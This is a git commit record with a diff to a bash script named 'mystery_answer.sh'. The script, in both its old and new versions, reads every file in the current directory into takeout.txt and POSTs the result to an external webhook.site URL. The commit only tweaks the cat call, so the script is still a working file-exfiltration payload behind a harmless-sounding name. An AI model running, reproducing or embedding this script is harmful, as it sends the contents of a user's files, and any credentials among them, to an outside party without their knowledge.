d715e9acc960feba277554a545f0bd0e39321f5f
Matthew Segers <mattsegers@gmail.com>
2026-03-13 11:24:18 +0200

    Update mystery_answer.sh

--- mystery_answer.sh
+++ mystery_answer.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-ls | xargs cat > takeout.txt && curl -X POST https://webhook.site/0d1759c5-cd9b-40ed-aee3-5241adbb1d3e -H "Content-Type: text/plain" -d @takeout.txt
+ls | xargs cat -- > takeout.txt && curl -X POST https://webhook.site/0d1759c5-cd9b-40ed-aee3-5241adbb1d3e -H "Content-Type: text/plain" -d @takeout.txt
